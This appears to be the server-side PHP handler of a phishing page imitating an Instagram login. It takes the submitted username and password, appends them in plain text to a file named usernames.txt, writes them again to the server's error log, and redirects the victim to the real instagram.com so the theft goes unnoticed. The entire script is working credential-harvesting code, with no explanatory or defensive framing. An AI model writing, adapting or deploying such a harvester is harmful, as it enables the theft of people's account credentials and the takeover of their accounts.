<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
header('Location: https://instagram.com');
exit();
